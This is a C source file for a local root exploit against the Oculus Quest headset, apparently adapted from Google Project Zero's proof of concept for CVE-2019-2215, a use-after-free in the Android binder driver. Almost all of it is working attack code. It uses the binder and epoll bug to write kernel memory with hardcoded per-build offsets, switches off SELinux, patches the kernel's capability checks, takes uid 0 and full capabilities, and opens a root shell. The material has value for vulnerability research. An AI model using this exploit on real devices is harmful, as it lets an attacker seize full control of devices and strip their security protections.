/*
 * Oculus Quest system root exploit
 *  adc
 *
 *
 * POC to gain arbitrary kernel R/W access using CVE-2019-2215
 * https://bugs.chromium.org/p/project-zero/issues/detail?id=1942
 *
 * Jann Horn & Maddie Stone of Google Project Zero
 *
 * 3 October 2019
*/
#define _GNU_SOURCE
#include <stdbool.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <ctype.h>
#include <sys/uio.h>
#include <err.h>
#include <sched.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <linux/sched.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <errno.h>
#include <sys/capability.h>
#include <sys/utsname.h>

int ocu = 0;

struct _offset {
  char *version;
  uint64_t swapper;
  uint64_t selinux_enable;
  uint64_t selinux_enforcing;
  uint64_t setcap;
};

struct _offset _offsets[] = {
  {"#1 SMP PREEMPT Mon Sep 30 14:10:10 PDT 2019",
   0x2536000 - 0x1f90000,
   0x1fe4398 - 0x1f90000,
   0x21f8bd4 - 0x1f90000,
   0x291a5c - 0x10000,
  },
  {"#1 SMP PREEMPT Thu Oct 17 23:11:36 PDT 2019",
   0x2536000 - 0x1f90000,
   0x1fe4398 - 0x1f90000,
   0x21f8bd4 - 0x1f90000,
   0x281aa4},
  {"#1 SMP PREEMPT Tue Oct 22 18:13:26 PDT 2019",
   0x2536000 - 0x1f90000,
   0x1fe4398 - 0x1f90000,
   0x21f8bd4 - 0x1f90000,
   0x281aa4}
};

struct _offset *gOffsets;

#define BINDER_THREAD_EXIT 0x40046208ul

//#define BINDER_THREAD_SZ 0x190
#define FULL_BINDER_THREAD_SZ 0x130

#define BINDER_THREAD_SZ (FULL_BINDER_THREAD_SZ)
#define IOVEC_ARRAY_SZ (BINDER_THREAD_SZ / 16) //25

//#define WAITQUEUE_OFFSET 0xa0
#define WAITQUEUE_OFFSET 0x48
#define IOVEC_INDX_FOR_WQ (WAITQUEUE_OFFSET / 16) //10


int epfd;

void *dummy_page_4g_aligned;
unsigned long current_ptr;
int binder_fd;

struct binder_write_read {
    size_t           write_size;     /* bytes to write */
    size_t           write_consumed; /* bytes consumed by driver */
    uintptr_t        write_buffer;
    size_t           read_size;      /* bytes to read */
    size_t           read_consumed;  /* bytes consumed by driver */
    uintptr_t        read_buffer;
};

struct binder_transaction_data {
    /* The first two are only used for bcTRANSACTION and brTRANSACTION,
     * identifying the target and contents of the transaction.
     */
    union {
        /* target descriptor of command transaction */
        __u32   handle;
        /* target descriptor of return transaction */
        uintptr_t ptr;
    } target;
    uintptr_t        cookie; /* target object cookie */
    __u32           code;           /* transaction command */

    /* General information about the transaction. */
    __u32           flags;
    pid_t           sender_pid;
    uid_t           sender_euid;
    size_t   data_size;      /* number of bytes of data */
    size_t   offsets_size;   /* number of bytes of offsets */

    /* If this transaction is inline, the data immediately
     * follows here; otherwise, it ends with a pointer to
     * the data buffer.
     */
    union {
        struct {
            /* transaction data */
            uintptr_t        buffer;
            /* offsets from buffer to flat_binder_object structs */
            uintptr_t        offsets;
        } ptr;
        __u8    buf[8];
    } data;
};

struct write_message {
    uint32_t cmd;
    struct binder_transaction_data tr;
};

#define BR_OK  _IO('r', 1)
#define BR_TRANSACTION_COMPLETE  _IO('r', 6)
#define BR_FAILED_REPLY  _IO('r', 17)

#define BINDER_WRITE_READ           _IOWR('b', 1, struct binder_write_read)
#define BC_REPLY 		    _IOW('c', 1, struct binder_transaction_data)
#define BC_TRANSACTION        	    _IOW('c', 0, struct binder_transaction_data)
#define BINDER_SET_CONTEXT_MGR          _IOW('b', 7, __s32)

void thread_mmap(void)
{
    void *addr;
    addr = mmap(NULL, 4096*10, PROT_READ, MAP_PRIVATE, binder_fd, 0);
    if ((uint64_t)-1 == (uint64_t)addr) {
        printf("failed to mmap\n");
        perror("failed");
    }

}

uint64_t text_base;
uint64_t data_base;
uint64_t mem_base;

void
read_kernel_base()
{
    struct utsname uts;
    if (uname(&uts) != 0) {
      perror("uname");
      exit(1);
    }
    for (int i = 0; i < sizeof(_offsets)/sizeof(_offsets[0]); i++) {
      if (!strcmp(uts.version, _offsets[i].version)) {
        gOffsets = &_offsets[i];
      }
    }
    if (NULL == gOffsets) {
      printf("unknown version %s\n", uts.version);
      exit(1);
    }

    if (ocu) {
        unlink("/data/local/tmp/dmesg.txt");
        system("dmesg | grep -E \"Virtual kernel\" -A 11 > /data/local/tmp/dmesg.txt");
    }

    FILE *f = fopen("/data/local/tmp/dmesg.txt", "r");
    if (!f) {
        printf("could not get dmesg output\n");
        exit(2);
    }

    char buf[256];
    memset(buf, 0, sizeof(buf));
    char keep = 0x00;
    while (fgets(buf, sizeof(buf), f)) {
        char *p= NULL;
        if ((p=strstr(buf, ".text"))) {
            p = strstr(p, "0x");
            text_base = strtoull(p, NULL, 16);
        }
        else if ((p=strstr(buf, ".data"))) {
            p = strstr(p, "0x");
            data_base = strtoull(p, NULL, 16);
        }
        else if ((p=strstr(buf, "memory  :"))) {
            p = strstr(p, "0x");
            mem_base = strtoull(p, NULL, 16);
        }
    }
    fclose(f);
    unlink("/data/local/tmp/dmesg.txt");

    printf("[+] kernel text base @ %lx data base @ %lx\n", text_base, data_base);
}


void force_thread(void) {
/*
TBD -> have a race here where the message might get processed,

*/
    /*
      make thread->todo empty
      and thread->return_error as BR_OK
      and looper not BINDER_LOOPER_STATE_NEED_RETURN
    while also
      thread->transaction_stack != NULL

    	list_add_tail(&t->work.entry, target_list);

    so after 1 msg we expect
    	tcomplete->type = BINDER_WORK_TRANSACTION_COMPLETE;
    	list_add_tail(&tcomplete->entry, &thread->todo);

    */
    struct write_message wm;
    memset(&wm, 0, sizeof(wm));
    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    //write a reply to a non existant message
    bwr.write_size = 1;
    bwr.write_buffer = (uintptr_t)&wm;

    wm.cmd = BC_TRANSACTION;

    //note -> default handle being used (0) -> ctx_mgr
    wm.tr.data_size = 0;

    bwr.read_size = 4096;
    bwr.read_buffer = (uintptr_t)calloc(4096, 1);

    int ret = ioctl(binder_fd, BINDER_WRITE_READ, &bwr);
    if (ret != 0) err(1, "BINDER_WRITE_READ didnt work");
}

int is_init = 0;
void _kwrite(uint64_t address, uint64_t value)
{
    if (!is_init) {
        dummy_page_4g_aligned = mmap((void*)0x100000000UL, 0x20000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
        if (dummy_page_4g_aligned != (void*)0x100000000UL)
            err(1, "mmap 4g aligned");


        binder_fd = open("/dev/binder", O_RDONLY);

        thread_mmap();

        if (!ocu) {
            //during testing -> binder needs a context manager
            int ret;
            ret = ioctl(binder_fd, BINDER_SET_CONTEXT_MGR, 0);
            printf("set ctxt mgr ioctl ret %d\n", ret);
        }

        epfd = epoll_create(1000);
        is_init = 1;
    }

    force_thread();

    struct epoll_event event = { .events = EPOLLIN };

    if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event)) err(1, "epoll_add");

    void *page1337 = calloc(1, 4096);
    //because of the 1-offset we cant control from the spinlock-size
    //everything has to be slid by 1 byte/ 7 bytes

    uint64_t *x = (uint64_t *) (page1337 + 7);
    for(int i = 0; i < 4096/8; i++) {
        x[i] = 0x1337babe13370000 | i;
    }

    x[0x1f7] = address - 0x20;
    x[0x1f8] = 0;
    x[0x1f9] = 0;
    x[0x1fa] = 0;
    x[0x1fb] = value;

    uint64_t myiovec[FULL_BINDER_THREAD_SZ/sizeof(uint64_t)];
    memset(myiovec, 0, sizeof(myiovec));

    myiovec[0] = (uint64_t) dummy_page_4g_aligned;
    myiovec[1] = 0x10001;

    myiovec[2] = (uint64_t)page1337;
    myiovec[3] = 0x20; //overwrites iovec

    myiovec[4] = (uint64_t)page1337;
    myiovec[5] = 0x1000;  //writes our data

    int b;

    int pipefd[2];
    if (pipe(pipefd)) err(1, "pipe");


    if (fcntl(pipefd[0], F_SETPIPE_SZ, 0x1000) != 0x1000) err(1, "pipe size");
    static char page_buffer[0x1000];

    pid_t fork_ret = fork();
    if (fork_ret == -1) err(1, "fork");
    if (fork_ret == 0) {
        /* Child process */
        prctl(PR_SET_PDEATHSIG, SIGKILL);

        sleep(1); //wait for parent

        //smash the write  dest
        printf("PARENT: Doing EPOLL_CTL_DEL.\n");
        epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &event);
        printf("PARENT: Finished EPOLL_CTL_DEL.\n");

        b = writev(pipefd[1], (struct iovec *)myiovec, IOVEC_ARRAY_SZ);
        printf("child writev() returns 0x%x\n", (unsigned int)b);

        close(pipefd[1]);
        printf("CHILD: Finished write to FIFO.\n");

        exit(0);
    }


    //call exit
    ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);

    //have parent replace with *read* right away
    struct iovec iovec_array[IOVEC_ARRAY_SZ];

    memset(iovec_array, 0, sizeof(iovec_array));

    iovec_array[0].iov_base = dummy_page_4g_aligned;
    //fill up pipe a bit to force splitting across the incoming buffer
    //0x20 for the iovec overwrite and 0x1 for the offset

    iovec_array[0].iov_len = 0x1000 - 0x21;

    //4/5 get clobbered
    iovec_array[4].iov_base = dummy_page_4g_aligned;
    iovec_array[4].iov_len = 0; //spin lock - > 0x10001
    iovec_array[5].iov_base = dummy_page_4g_aligned; //smashed
    iovec_array[5].iov_len = 0x10001; //smashed

    //this overwrites the iovec
    iovec_array[6].iov_base = dummy_page_4g_aligned;
    iovec_array[6].iov_len = 0x20; //covers the iov write

    //this gets overwritten and will get smashed
    iovec_array[7].iov_base = dummy_page_4g_aligned;
    iovec_array[7].iov_len = 0x8; //NOTE, this determines *how much* is written in the smash

    b = readv(pipefd[0], iovec_array, IOVEC_ARRAY_SZ);
    printf("parent readv %x\n",  b);

    int status;
    if (wait(&status) != fork_ret) err(1, "wait");
    close(pipefd[0]);
    close(pipefd[1]);
    printf("PARENT: Finished calling READV\n");
}

void kwrite(uint64_t address, uint64_t value)
{
    int do_fork = 0; //...

    if (do_fork) {
        pid_t fork_ret = fork();
        if (fork_ret == -1) err(1, "fork");
        if (fork_ret == 0) {
            /* Child process */
            _kwrite(address, value);
            //exit(0);
        } else {
            int status;
            if (wait(&status) != fork_ret) err(1, "wait");
        }
    } else {
        _kwrite(address, value);
       printf("==\n");
    }
}


uint64_t base;

void pkwrite(uint64_t target, uint64_t value) {
  //set up base start @ 0x80000000; but text actually starts at +0x80000 from that
  //so to get to target we first want that delta
  uint64_t delta = (text_base - 0x80000);
  uint64_t *dest = (uint64_t *) ((target - delta) + base);
  *dest= value;
}

void pkwrite32(uint64_t target, uint32_t value) {
  //set up base start @ 0x80000000; but text actually starts at +0x80000 from that
  //so to get to target we first want that delta
  uint64_t delta = (text_base - 0x80000);
  uint32_t *dest = (uint32_t *) ((target - delta) + base);
  *dest = value;
}

void pkwrite8(uint64_t target, uint8_t value) {
  //set up base start @ 0x80000000; but text actually starts at +0x80000 from that
  //so to get to target we first want that delta
  uint64_t delta = (text_base - 0x80000);
  uint8_t *dest = (uint8_t *) ((target - delta) + base);
  *dest = value;
}

uint64_t pkread(uint64_t target) {
  //set up base start @ 0x80000000; but text actually starts at +0x80000 from that
  //so to get to target we first want that delta
  uint64_t delta = (text_base - 0x80000);
  uint64_t *src = (uint64_t *) ((target - delta) + base);
  return *src;
}

uint32_t pkread32(uint64_t target) {
  //set up base start @ 0x80000000; but text actually starts at +0x80000 from that
  //so to get to target we first want that delta
  uint64_t delta = (text_base - 0x80000);
  uint32_t *src = (uint32_t *) ((target - delta) + base);
  return *src;
}

uint8_t pkread8(uint64_t target) {
  //set up base start @ 0x80000000; but text actually starts at +0x80000 from that
  //so to get to target we first want that delta
  uint64_t delta = (text_base - 0x80000);
  uint8_t *src = (uint8_t *) ((target - delta) + base);
  return *src;
}


void  patch32(uint64_t target, uint32_t oldval, uint32_t new_val)
{
  uint32_t curval = pkread32(target);
  if (curval != oldval) {
    printf("[X] Warning, not patching @ %lx, saw %x expected %x\n", target, curval, oldval);
  } else {
    pkwrite32(target, new_val);
  }

}

void root()
{
  //disable selinux
  uint64_t selinux_enable_addr    = data_base + gOffsets->selinux_enable;
  uint64_t selinux_enforcing_addr = data_base + gOffsets->selinux_enforcing;

  printf("Before:\n");
  printf("enable    = %x\n", pkread32(selinux_enable_addr));
  printf("enforcing = %x\n", pkread32(selinux_enforcing_addr));

  pkwrite32(selinux_enable_addr, 0);
  pkwrite32(selinux_enforcing_addr, 0);

  printf("After:\n");
  printf("enable    = %x\n", pkread32(selinux_enable_addr));
  printf("enforcing = %x\n", pkread32(selinux_enforcing_addr));

  printf("patching cap_setcap() to always succeed\n");
  patch32(text_base + gOffsets->setcap, 0x35000820, 0xd503201f); //nop

  patch32(text_base + gOffsets->setcap + 0x2c, 0x35000840, 0xd503201f); //
  patch32(text_base + gOffsets->setcap + 0x30, 0x35000821, 0xd503201f); //nop checks

  patch32(text_base + gOffsets->setcap + 0x4c, 0x35000741, 0xd503201f); //
  patch32(text_base + gOffsets->setcap + 0x50, 0x35000734, 0xd503201f); //nop checks

  patch32(text_base + gOffsets->setcap + 0x68, 0x35000660, 0xd503201f); //
  patch32(text_base + gOffsets->setcap + 0x6c, 0x35000641, 0xd503201f); //nop checks

  struct __user_cap_header_struct capheader;
  struct __user_cap_data_struct capdata[2];

  memset(&capheader, 0, sizeof(capheader));
  memset(&capdata, 0, sizeof(capdata));
  capheader.version = _LINUX_CAPABILITY_VERSION_3;
  capdata[0].effective = 0xffffffff;
  capdata[0].permitted = 0xffffffffL;
  capdata[0].inheritable = 0xffffffffL;
  capdata[1].effective = 0x3f;
  capdata[1].permitted = 0x3f;
  capdata[1].inheritable = 0x3f;
  if (capset(&capheader, &capdata[0]) < 0) {
      printf("Could not set capabilities: %s\n", strerror(errno));
  } else {
    printf("[+] capset happy.\n");
  }


  int ret;
  ret = setresuid(0, 0, 0);
  printf("setresuid returned %d\n", ret);

  ret = setresgid(0, 0, 0);
  printf("setresgid returned %d\n", ret);
  printf("spawning shell\n");

  system("echo 0 > /proc/sys/kernel/kptr_restrict");
  system("sh");
}

int main(int argc, char *argv[]) {
    printf("Starting POC\n");

    ocu = !(getuid() == 0);

    read_kernel_base();

    base = 0xfffffff800000000;
    uint64_t index = (base & ~0xffffff8000000000)>>30;
    printf("index %lu\n", index);

    uint64_t target = data_base + gOffsets->swapper + index*8;
    uint64_t value = 0x751 + (0x00e8000000000000);
    value += (0x80000000); //fixed physmem address

    if(!argv[1]) {
        kwrite(target, value);
        printf("wrote 0x%lx @ 0x%lx\n", value, target);
        printf("kwrite done\n");
    }
    printf("memory test\n");

    uint64_t *addr = (uint64_t *) (base + (argv[1] ? strtoull(argv[1],0,0) : 0));
    printf("try to read @ %p. Rerun if this crashes\n", addr);
    fflush(NULL);
    printf("read %p -> %lx\n", addr, *addr);

    //base now points to the start of physical memory where .text is
    //can write up to 1gb (1<<30) with this method
    //data @ + 0x200000

    root();
    return 0;
}
